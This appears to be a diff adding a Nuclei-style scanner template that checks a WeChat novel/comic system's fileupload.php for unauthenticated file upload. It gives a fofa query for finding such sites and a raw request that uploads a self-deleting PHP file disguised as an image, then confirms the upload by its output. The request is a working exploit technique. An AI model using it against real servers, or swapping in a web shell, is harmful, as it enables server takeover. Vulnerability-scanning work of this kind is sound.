@@ -1,0 +1,47 @@
+id: wxxiaoshuo-fileupload_php-File-upload
+
+info:
+  name: "微信公众号小说漫画系统 fileupload.php 未授权文件上传"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Public/home/mhjs/jquery.js"
+      微信公众号小说漫画系统 fileupload.php 接口因文件上传验证机制缺失，存在未授权文件上传漏洞。攻击者可绕过身份验证直接上传恶意文件，通过远程代码执行实现服务器控制权获取，最终导致系统被完全接管。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487947&idx=1&sn=883e0169fe69153d7029988e0b6ed422&chksm=c267a4f8f5102deed8f261825348fd278726ad5412cd406f8b60dacfcf6c6e9f30c77b3fc6d8&token=48786214&lang=zh_CN#rd
+  tags: 微信公众号小说漫画系统
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+    --d0b7a0d40eed0e32904c8017b09eb305
+    Content-Disposition: form-data; name="file"; filename="{{username}}.php"
+    Content-Type: image/jpeg
+
+    <?php print(111*222);unlink(__FILE__);?>
+    --d0b7a0d40eed0e32904c8017b09eb305--
+  - |
+    GET /Public/webuploader/0.1.5/server/upload/{{username}}.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '24642'
+  - type: status
+    status:
+    - 200
+
+
+
+
